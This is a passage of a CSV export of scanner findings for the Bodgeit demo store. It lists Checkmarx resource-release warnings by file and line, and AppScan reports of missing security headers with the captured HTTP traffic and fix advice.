"DemoApps","","Bodgeit","543","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","580","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","590","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","598","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","599","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","647","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","284","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","334","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","339","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","380","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","386","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","416","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","422","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","450","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","525","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","532","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","562","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","271","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","348","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","451","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","581","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","650","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/contact.jsp","comments","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","429","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","499","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","523","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","540","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","289","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","304","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","322","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","342","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","351","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","357","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","372","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","373","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","376","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","387","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","414","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","428","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","438","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","490","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","491","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","568","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","569","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","606","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","609","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","611","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","621","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","627","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","642","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","665","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","668","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","360","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","username","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","612","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/login.jsp","username","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","298","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","640","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","655","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/password.jsp","password1","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","564","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","476","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/product.jsp","prodid","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","520","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/product.jsp","prodid","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","397","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/product.jsp","typeid","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","495","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/product.jsp","typeid","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","280","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","312","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","314","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","320","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","383","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","436","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","448","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","453","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","472","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","484","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","492","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","496","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","504","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","506","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","529","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","565","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","576","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","584","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","604","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","617","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","631","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","651","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","666","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","330","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","446","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","272","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","447","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","592","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","615","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","300","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","329","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","566","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","88","Missing ""X-Content-Type-Options"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/","","","http://localhost/bodgeit/","","GET /bodgeit/ HTTP/1.1 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3213 Date: Thu, 15 Oct 2015 22:24:04 GMT Set-Cookie: JSESSIONID=74278EC797FF1FA855EA3C632039CE05; Path=/bodgeit/; HttpOnly <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=15"">TGJ HHI</a></td><td>Thingamajigs</td><td align=""right"">$2.10</td> </tr> <tr> <td><a href=""product.jsp?prodid=2"">Complex Widget</a></td><td>Widgets</td><td align=""right"">$3.10</td> </tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=25"">GZ K77</a></td><td>Gizmos</td><td align=""right"">$3.05</td> </tr> <tr> <td><a href=""product.jsp?prodid=13"">TGJ EFF</a></td><td>Thingamajigs</td><td align=""right"">$3.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=5"">Thingie 2</a></td><td>Thingies</td><td align=""right"">$3.20</td> </tr> <tr> <td><a href=""product.jsp?prodid=9"">TGJ AAA</a></td><td>Thingamajigs</td><td align=""right"">$0.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=2"">Complex Widget</a></td><td>Widgets</td><td align=""right"">$3.10</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the X-Content-Type-Options response header is missing, which increases exposure to drive-by download attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-Content-Type-Options"" header with value ""nosniff"" on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","101","Missing ""Content-Security-Policy"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/about.jsp","about.jsp","","http://localhost/bodgeit/about.jsp","","GET /bodgeit/about.jsp HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2197 Date: Thu, 15 Oct 2015 22:20:52 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact 